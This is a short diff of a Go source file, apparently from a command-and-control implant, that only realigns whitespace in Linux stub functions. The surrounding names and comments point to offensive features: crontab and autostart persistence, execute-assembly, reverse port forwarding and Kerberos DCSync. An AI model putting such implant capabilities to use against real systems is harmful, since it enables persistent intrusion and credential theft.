@@ -79,7 +79,7 @@ func applyHideWindow(cmd *exec.Cmd) {
 
 // addPersistenceWindows is never called on linux, but provide for interface completeness
 func addPersistenceWindows() {}
-func addPersistenceDarwin() {}
+func addPersistenceDarwin()  {}
 
 // addPersistenceLinux installs @reboot crontab entry and ~/.config/autostart desktop file.
 func addPersistenceLinux() {
@@ -968,11 +968,11 @@ func executeAssemblyForkRun(b64Data string) (string, error) {
 	return "", fmt.Errorf("execute-assembly fork&run is Windows-only")
 }
 
-func rportfwdCollectOutbound() []socksFrame { return nil }
-func rportfwdHandleFrames(frames []socksFrame) {}
+func rportfwdCollectOutbound() []socksFrame     { return nil }
+func rportfwdHandleFrames(frames []socksFrame)  {}
 func rportfwdDial(connID uint64, target string) {}
-func rportfwdWrite(connID uint64, data []byte) {}
-func rportfwdClose(connID uint64) {}
+func rportfwdWrite(connID uint64, data []byte)  {}
+func rportfwdClose(connID uint64)               {}
 
 func kerberosDCSync(user string) (string, error) {
 	return "", fmt.Errorf("DCSync is Windows-only")
